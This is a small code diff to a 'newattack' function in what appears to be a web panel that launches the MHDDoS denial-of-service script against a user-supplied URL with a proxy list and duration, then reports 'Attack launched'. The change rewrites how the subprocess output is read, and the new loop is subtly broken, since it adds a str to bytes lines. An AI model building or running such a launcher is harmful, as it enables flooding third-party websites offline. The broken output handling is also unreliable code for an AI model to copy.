@@ -64,9 +64,11 @@ def newattack():
         # startinng the attack 
         arguments = [f"{type_attack}", f"{url}", "0", "100", "proxies.txt", f"{time}"]
         command = ["python3", "data/mhddos/start.py"] + arguments
-        x = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(command, stdout=subprocess.PIPE)
         
-        out = x.stdout.read()
+        out = ""
+        for line in process.stdout:
+            out += line + "\n"  
         flash(f"Attack launched \n {out}")
         LOGS.info("New attack launched")
     
